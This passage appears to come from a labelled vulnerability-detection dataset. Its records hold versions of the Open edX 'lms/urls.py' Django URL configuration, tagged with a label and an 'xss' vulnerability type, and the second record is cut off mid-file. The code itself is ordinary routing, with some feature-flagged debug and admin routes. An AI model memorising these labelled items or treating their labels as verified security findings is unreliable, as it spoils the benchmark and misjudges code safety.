url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', 